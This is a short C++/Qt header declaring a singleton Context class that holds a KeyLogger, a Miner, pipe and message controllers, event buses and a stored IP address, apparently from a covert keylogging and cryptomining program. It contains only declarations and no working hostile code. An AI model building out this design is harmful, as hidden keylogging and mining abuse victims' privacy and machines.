#ifndef CONTEXT_H
#define CONTEXT_H

#include <QObject>
#include <QDir>
#include "KeyLogger.h"
#include "PipeController.h"
#include "MessageController.h"
#include <worker/Miner.h>

#include "core/EventBus.h"


class Context : public QObject
{
    Q_OBJECT
    
public:
    static Context &instance()
    {
        static Context i;
        return i;
    }

    KeyLogger *keyLogger;
    PipeController *pipeController;
    MessageController *messageController;
    EventBus busMain;
    EventBus busNetwork;
    Miner *miner;
    
    QString getIp() { return _ip; }
    void setIp(QString value) { _ip = value; }
    
    QDir databasePath();
    QDir appDataPath();
    
    void load();
    
private:
    Context(QObject *parent = nullptr);
    Context(const Context &other);
    Context &operator =(const Context &other);

    QString _ip;
};

#endif // CONTEXT_H
